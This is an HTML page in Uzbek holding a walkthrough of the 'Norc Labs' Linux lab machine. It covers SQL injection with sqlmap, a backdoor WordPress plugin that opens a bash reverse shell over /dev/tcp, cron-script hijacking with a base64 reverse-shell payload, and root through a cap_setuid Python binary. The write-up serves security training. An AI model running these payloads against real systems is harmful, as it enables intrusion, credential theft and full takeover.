@@ -1,0 +1,396 @@
+<!DOCTYPE html>
+<html lang="uz-uz">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <head><meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">Walkthrough: Norc Labs (Linux) | Shahzod&#39;s Knowledge Base</title>
+<meta property="og:title" content="Walkthrough: Norc Labs (Linux) | Shahzod&#39;s Knowledge Base" />
+<meta name="twitter:title" content="Walkthrough: Norc Labs (Linux) | Shahzod&#39;s Knowledge Base" />
+<meta itemprop="name" content="Walkthrough: Norc Labs (Linux) | Shahzod&#39;s Knowledge Base" />
+<meta name="application-name" content="Walkthrough: Norc Labs (Linux) | Shahzod&#39;s Knowledge Base" />
+<meta property="og:site_name" content="" />
+
+<meta name="description" content="SQL Injection, Malicious WordPress Plugin va Linux Capabilities orqali Root huquqini olish.">
+<meta itemprop="description" content="SQL Injection, Malicious WordPress Plugin va Linux Capabilities orqali Root huquqini olish." />
+<meta property="og:description" content="SQL Injection, Malicious WordPress Plugin va Linux Capabilities orqali Root huquqini olish." />
+<meta name="twitter:description" content="SQL Injection, Malicious WordPress Plugin va Linux Capabilities orqali Root huquqini olish." />
+
+<meta property="og:locale" content="uz-uz" />
+<meta name="language" content="uz-uz" />
+
+  <link rel="alternate" hreflang="en" href="http://localhost:1313/posts/norc-labs-writeup/" title="" />
+
+
+
+
+
+    
+    
+    
+
+    <meta property="og:type" content="article" />
+    <meta property="og:article:published_time" content=2026-02-01T00:00:00Z />
+    <meta property="article:published_time" content=2026-02-01T00:00:00Z />
+    <meta property="og:url" content="http://localhost:1313/posts/norc-labs-writeup/" />
+
+    
+
+    
+
+    <script defer type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "Article",
+        "headline": "Walkthrough: Norc Labs (Linux)",
+        "author": {
+        "@type": "Person",
+        "name": ""
+        },
+        "datePublished": "2026-02-01",
+        "description": "SQL Injection, Malicious WordPress Plugin va Linux Capabilities orqali Root huquqini olish.",
+        "wordCount":  680 ,
+        "mainEntityOfPage": "True",
+        "dateModified": "2026-02-01",
+        "image": {
+        "@type": "imageObject",
+        "url": ""
+        },
+        "publisher": {
+        "@type": "Organization",
+        "name": "Shahzod\u0027s Knowledge Base"
+        }
+    }
+    </script>
+
+
+<meta name="generator" content="Hugo 0.152.2">
+
+    
+    <meta property="og:url" content="http://localhost:1313/posts/norc-labs-writeup/">
+  <meta property="og:site_name" content="Shahzod&#39;s Knowledge Base">
+  <meta property="og:title" content="Walkthrough: Norc Labs (Linux)">
+  <meta property="og:description" content="SQL Injection, Malicious WordPress Plugin va Linux Capabilities orqali Root huquqini olish.">
+  <meta property="og:locale" content="uz_uz">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-02-01T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-02-01T00:00:00+00:00">
+    <meta property="article:tag" content="Linux">
+    <meta property="article:tag" content="SQLi">
+    <meta property="article:tag" content="WordPress">
+    <meta property="article:tag" content="PrivEsc">
+    <meta property="article:tag" content="Capabilities">
+
+
+    
+    
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Walkthrough: Norc Labs (Linux)">
+  <meta name="twitter:description" content="SQL Injection, Malicious WordPress Plugin va Linux Capabilities orqali Root huquqini olish.">
+
+
+    
+
+    <link rel="canonical" href="http://localhost:1313/posts/norc-labs-writeup/">
+    <link href="/style.min.e390ba7da26222f4dc42a349955d76dbbe44e5ce2535a43de5a70633a0a9ec3c.css" rel="stylesheet">
+    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
+
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
+    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
+    <link rel="shortcut icon" href="/favicon.ico">
+
+
+
+
+<link rel="manifest" href="http://localhost:1313/site.webmanifest">
+
+<meta name="msapplication-config" content="/browserconfig.xml">
+<meta name="msapplication-TileColor" content="#2d89ef">
+<meta name="theme-color" content="#434648">
+    <meta name="color-scheme" content="light dark">
+
+    
+    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">
+
+    
+    
+</head>
+
+
+    <style>
+         
+        body {
+            background-color: #050505 !important;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            margin: 0;
+        }
+
+         
+        .container-wrapper {
+            max-width: 1100px;  
+            width: 95%;         
+            margin: 0 auto;     
+            padding: 0 20px;
+            box-sizing: border-box;
+        }
+
+         
+        main {
+            flex: 1;
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center; 
+        }
+
+         
+        header.main-header { display: none !important; }
+
+         
+        a { text-decoration: none; }
+
+         
+        img {
+            max-width: 100%;
+            height: auto;
+            display: block;
+            margin: 20px auto;
+        }
+
+         
+        .container-wrapper h1 {
+            margin-top: 10px !important;  
+            padding-top: 0 !important;
+        }
+    </style>
+</head>
+
+<body class="dark">
+
+    <header style="
+    background-color: #080808; /* Asosiy fondan (050505) biroz farq qiladi */
+    border-bottom: 1px solid #33ff00; /* Tagidagi chiziq - aniq YASHIL */
+    box-shadow: 0 5px 15px -5px rgba(51, 255, 0, 0.3); /* Yashil 'nur' (Glow effect) */
+    margin-bottom: 40px; /* Kontentdan uzoqlashtirish */
+    padding: 20px 0;
+    font-family: 'Courier New', monospace;
+    position: sticky; /* Tepada yopishib turishi uchun (ixtiyoriy) */
+    top: 0;
+    z-index: 1000;
+">
+    <div class="container" style="max-width: 1100px; margin: 0 auto; padding: 0 20px; display: flex; justify-content: space-between; align-items: center;">
+        
+        <a href="/" style="text-decoration: none; color: #33ff00; font-weight: bold; font-size: 1.3rem; text-shadow: 0 0 8px rgba(51, 255, 0, 0.6); letter-spacing: -1px;">
+            ~/root
+        </a>
+
+        <nav>
+            <ul style="list-style: none; display: flex; margin: 0; padding: 0;">
+                
+                <li style="margin-left: 30px;">
+                    <a href="/posts/" style="text-decoration: none; color: #e0e0e0; font-size: 1.1rem; transition: all 0.3s ease;">
+                        ~/write-ups
+                    </a>
+                </li>
+                
+                <li style="margin-left: 30px;">
+                    <a href="/manuals/" style="text-decoration: none; color: #e0e0e0; font-size: 1.1rem; transition: all 0.3s ease;">
+                        ~/manuals
+                    </a>
+                </li>
+                
+            </ul>
+        </nav>
+        
+    </div>
+</header>
+
+<style>
+     
+    nav a:hover {
+        color: #33ff00 !important;
+        text-shadow: 0 0 8px #33ff00;
+    }
+</style>
+
+    <main>
+        <div class="container-wrapper">
+            
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">Walkthrough: Norc Labs (Linux)</h1>
+                
+                
+                
+                <div class="post-meta">
+                    <time datetime="2026-02-01T00:00:00&#43;00:00" itemprop="datePublished"> Feb 1, 2026 </time>
+                </div>
+                
+            </header>
+            
+            <div class="page-content">
+                <h1 id="-machine-info">🕵️ Machine Info</h1>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: left">IP Address</th>
+          <th style="text-align: left">OS</th>
+          <th style="text-align: left">Vulnerabilities</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left"><strong>10.15.0.49</strong></td>
+          <td style="text-align: left">Linux</td>
+          <td style="text-align: left">SQL Injection, RCE, Cron Job, Capabilities</td>
+      </tr>
+  </tbody>
+</table>
+<blockquote>
+<p><strong>Qisqacha xulosa:</strong></p>
+<ul>
+<li><strong>Sensitive Information Disclosure:</strong> SQL Injection va himoyalanmagan subdomen orqali login va parollar fosh bo&rsquo;lishi.</li>
+<li><strong>Remote Code Execution (RCE):</strong> WordPress admin paneli orqali zararli plagin yuklash va kod ijro etish imkoniyati.</li>
+<li><strong>Insecure File Permissions:</strong> <code>www-data</code> foydalanuvchisi o&rsquo;zgartira oladigan faylning Cron Job orqali ishga tushirilishi (Privilege Escalation).</li>
+<li><strong>Linux Capabilities Abuse:</strong> <code>/opt/python3</code> binar faylidagi <code>cap_setuid</code> ruxsati orqali Root huquqini olish.</li>
+</ul>
+</blockquote>
+<hr>
+<h1 id="1-bosqich-razvedka-reconnaissance">1-Bosqich: Razvedka (Reconnaissance)</h1>
+<p>Bizning birinchi ishimiz — nishonda qaysi portlar ochiqligini aniqlash. Buning uchun <code>nmap</code> dan foydalanamiz.</p>
+<h3 id="11-portlarni-skanerlash">1.1. Portlarni skanerlash</h3>
+<p>Avvaliga “yengil” scan qilib asosiy ochiq portlarni bilib olamiz.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap 10.15.0.49
+</span></span></code></pre></div><p><img src="1.nmap1.png" alt="Nmap yengil scan natijasi"></p>
+<p>Endi ochiq portlarni “chuqurroq” scan qilamiz:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p 22,80,2222 -sC -sV -A 10.15.0.49
+</span></span></code></pre></div><p><img src="2.nmap2.png" alt="Nmap chuqur scan natijasi"></p>
+<h3 id="12-virtual-hostlarni-sozlash-etchosts">1.2. Virtual Hostlarni sozlash (/etc/hosts)</h3>
+<p>Nmap yoki brauzer orqali IP ga kirganimizda, sayt bizni <code>norc.labs</code> domeniga yo&rsquo;naltiradi (redirect). Brauzerimiz bu nomni tushunishi uchun uni <code>/etc/hosts</code> fayliga qo&rsquo;shishimiz shart.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nano /etc/hosts
+</span></span></code></pre></div><p>Fayl oxiriga quyidagi qatorni qo&rsquo;shamiz (keyinchalik topiladigan subdomenlarni ham hoziroq qo&rsquo;shib ketamiz):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>10.15.0.49  norc.labs oledockers.norc.labs admin.oledockers.norc.labs
+</span></span></code></pre></div><hr>
+<h1 id="2-bosqich-veb-enumeratsiya-va-kirish-web-exploitation">2-Bosqich: Veb Enumeratsiya va Kirish (Web Exploitation)</h1>
+<h3 id="21-sql-injection-orqali-malumot-yigish">2.1. SQL Injection orqali ma&rsquo;lumot yig&rsquo;ish</h3>
+<p>Sayt WordPress ekanligini bildik. Login sahifasida (<code>wp-login.php</code>) cookie bilan bog&rsquo;liq SQL Injection zaifligi borligini aniqladik. Biz bu orqali foydalanuvchilar ro&rsquo;yxatini tortib olamiz.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap --dbms<span style="color:#f92672">=</span>mysql -u <span style="color:#e6db74">&#34;[http://norc.labs/wp-login.php](http://norc.labs/wp-login.php)&#34;</span> --cookie<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;wordpress_logged_in=*&#39;</span> --level<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span> -D wordpress -T wp_users --dump
+</span></span></code></pre></div><p>Bu buyruq ma&rsquo;lumotlar bazasidan foydalanuvchilar jadvalini (<code>wp_users</code>) ko&rsquo;rsatib beradi. Natija chiqishi uchun biroz vaqt ketadi va quyidagi kabi natija chiqadi:</p>
+<p><img src="3.sqlmap.png" alt="SQLMap Natijasi"></p>
+<blockquote>
+<p><strong>Muhim topilma:</strong> Biz <code>admin</code> foydalanuvchisining email manzilini topdik: <code>admin@oledockers.norc.labs</code>. Bu bizga <code>oledockers</code> subdomeni borligini fosh qildi.</p>
+</blockquote>
+<h3 id="22-maxfiy-parolni-topish">2.2. Maxfiy parolni topish</h3>
+<p>Endi yangi topilgan subdomenga kirib ko&rsquo;ramiz. Brauzerda quyidagi manzilni oching: (Bu subdomen <code>/etc/hosts</code> fayliga qo’shilgan bo’lishi kerak.)</p>
+<p><code>http://oledockers.norc.labs</code></p>
+<p>Bu sahifada admin o&rsquo;zi uchun qoldirgan &ldquo;Eslatma&rdquo; (Password Reminder) bor:</p>
+<blockquote>
+<p>Hi, this is just in case I forget my password -&gt; <strong>admin : wWZvgxRz3jMBQ ZN</strong></p>
+</blockquote>
+<h3 id="23-wordpress-dashboardga-kirish">2.3. WordPress Dashboardga kirish</h3>
+<p>Topilgan paroldan foydalanib, asosiy saytning admin paneliga kiramiz.</p>
+<p>Manzil: <code>http://norc.labs/ghost-admin</code></p>
+<p><img src="4.dashboard.png" alt="WordPress Dashboard Rasmi"></p>
+<hr>
+<h1 id="3-bosqich-shell-olish-initial-access">3-Bosqich: Shell olish (Initial Access)</h1>
+<p>Biz tizimga kirish uchun o&rsquo;zimizning &ldquo;josus&rdquo; kodimizni (Reverse Shell) yuklashimiz kerak. Buning eng oson yo&rsquo;li — zararli Plagin (Plugin) yaratishdir.</p>
+<h3 id="31-zararli-plagin-yaratish">3.1. Zararli plagin yaratish</h3>
+<p>Kali Linux terminalida quyidagi ishlarni bajaramiz:</p>
+<p><code>shell.php</code> faylini yaratamiz:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nano shell.php
+</span></span></code></pre></div><p>Ichiga quyidagi kodni yozamiz (IP o&rsquo;rniga o&rsquo;z IP&rsquo;mizni yozamiz!):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">/**
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">* Plugin Name: My Backdoor
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">* Version: 1.0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">* Author: Hacker
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">*/</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">exec</span>(<span style="color:#e6db74">&#34;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.XX.XX/4444 0&gt;&amp;1&#39;&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>Uni ZIP arxivga aylantiramiz:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>zip plugin.zip shell.php
+</span></span></code></pre></div><h3 id="32-plaginni-yuklash-va-shell-olish">3.2. Plaginni yuklash va Shell olish</h3>
+<p>O&rsquo;z terminalimizda tinglovchini yoqamiz:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -lvnp <span style="color:#ae81ff">4444</span>
+</span></span></code></pre></div><p>WordPress menyusidan <strong>Plugins -&gt; Add New Plugin -&gt; Upload Plugin</strong> ga o&rsquo;tamiz.
+<code>plugin.zip</code> faylini tanlab <strong>Install Now</strong> ni bosamiz.
+Install’ni bosib o’rnatganimizdan keyin <strong>Activate Plugin</strong> tugmasini bosishimiz bilan terminalimizda ulanish paydo bo&rsquo;ladi!</p>
+<hr>
+<h1 id="4-bosqich-tizimda-harakatlanish-lateral-movement">4-Bosqich: Tizimda harakatlanish (Lateral Movement)</h1>
+<p>Hozir biz <code>www-data</code> (veb server) foydalanuvchisimiz. Hozirgi maqsadimiz — <code>kvzlx</code> foydalanuvchisiga o&rsquo;tish.</p>
+<h3 id="41-shellni-barqarorlashtirish">4.1. Shellni barqarorlashtirish</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 -c <span style="color:#e6db74">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</span></span></code></pre></div><h3 id="42-zaif-cron-jobni-aniqlash">4.2. Zaif Cron Jobni aniqlash</h3>
+<p><code>kvzlx</code> foydalanuvchisining papkasini tekshirganimizda qiziq skript topdik:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ls -la /home/kvzlx/
+</span></span><span style="display:flex;"><span>cat /home/kvzlx/.cron_script.sh
+</span></span></code></pre></div><p>Skript <code>/var/www/html/.wp-encrypted.txt</code> faylini o&rsquo;qiydi, Base64 dan chiqaradi va <code>eval</code> orqali bajaradi. Biz <code>www-data</code> bo&rsquo;lganimiz uchun o&rsquo;sha matnli faylga yoza olamiz!</p>
+<h3 id="43-ekspluatatsiya-www-data---kvzlx">4.3. Ekspluatatsiya (www-data -&gt; kvzlx)</h3>
+<p>Biz o&rsquo;zimizning kodimizni Base64 ga o&rsquo;girib, o&rsquo;sha faylga yozamiz.</p>
+<p>Yangi terminal ochib tinglovchi yoqamiz (Port 5555):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -lvnp <span style="color:#ae81ff">5555</span>
+</span></span></code></pre></div><p>Eski terminalda (www-data shellida) quyidagi buyruqni beramiz (IP ni o&rsquo;zgartiramiz!):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;bash -i &gt;&amp; /dev/tcp/10.10.XX.XX/5555 0&gt;&amp;1&#34;</span> | base64 &gt; /var/www/html/.wp-encrypted.txt
+</span></span></code></pre></div><p>Bir daqiqa kutamiz. Cron job ishlaganida, bizning 5555-portimizdagi <code>kvzlx</code> foydalanuvchisi shell keladi.</p>
+<hr>
+<h1 id="5-bosqich-root-huquqini-olish-privilege-escalation">5-Bosqich: Root huquqini olish (Privilege Escalation)</h1>
+<p>Endi eng so&rsquo;nggi bosqich — Superuser (Root) bo&rsquo;lish.</p>
+<h3 id="51-capabilities-tekshiruvi">5.1. Capabilities tekshiruvi</h3>
+<p>Tizimda g&rsquo;ayrioddiy huquqlar (Capabilities) berilgan fayllarni qidiramiz:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>getcap -r / 2&gt;/dev/null
+</span></span></code></pre></div><p>Natijada: <code>/opt/python3 = cap_setuid+ep</code> chiqadi. Bu shuni anglatadiki, ushbu Python versiyasi o&rsquo;zining UID raqamini o&rsquo;zgartira oladi. Biz bundan foydalanib o&rsquo;zimizni <code>root</code> (UID 0) qilib belgilaymiz.</p>
+<h3 id="52-root-shell-olish">5.2. Root Shell olish</h3>
+<p>Quyidagi Python kodini ishga tushiramiz:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/opt/python3 -c <span style="color:#e6db74">&#39;import os; os.setuid(0); os.system(&#34;/bin/bash&#34;)&#39;</span>
+</span></span></code></pre></div><blockquote>
+<p>Buyruqdan so&rsquo;ng <code>whoami</code> deb tekshiramiz. Javob: <code>root</code>. Tabriklaymiz! Mashina to&rsquo;liq egallandi.</p>
+</blockquote>
+<hr>
+<h1 id="xulosa">Xulosa</h1>
+<p>Ushbu mashina orqali biz quyidagi muhim pentesting texnikalarini o&rsquo;rgandik:</p>
+<ul>
+<li><strong>VHost Enumeration:</strong> Yashirin subdomenlarni topish qanchalik muhimligi.</li>
+<li><strong>SQLi &amp; Info Disclosure:</strong> Ma&rsquo;lumotlar bazasi orqali email va domenlarni aniqlash.</li>
+<li><strong>Malicious Plugin:</strong> WordPress saytlarida shell olish usuli.</li>
+<li><strong>Insecure Cron Job:</strong> Ruxsatnomalar noto&rsquo;g&rsquo;ri sozlangan avtomatlashtirilgan skriptlardan foydalanish.</li>
+<li><strong>Capabilities Exploitation:</strong> Linux <code>setuid</code> imkoniyatlari orqali huquqni oshirish.</li>
+</ul>
+
+            </div>
+        </article></main>
+</div>
+
+        </div>
+    </main>
+
+    <footer style="margin-top: 50px; padding: 10px 0; border-top: 1px solid #333; font-family: 'Courier New', monospace; font-size: 0.9rem; color: #888; text-align: center;">
+    
+    <span style="background-color: #333; color: #fff; padding: 2px 8px; border-radius: 3px; margin-right: 10px;">
+        NORMAL MODE
+    </span>
+
+    <span>
+        coded by <span style="color: #2ecc71; font-weight: bold;">5h4hz0d</span> 
+    </span>
+    
+    <span style="margin: 0 10px;">|</span>
+    
+    <span>© 2026</span>
+
+    <span style="margin: 0 10px;">|</span>
+
+    <span>utf-8</span>
+
+</footer>
+
+</body>
+</html>
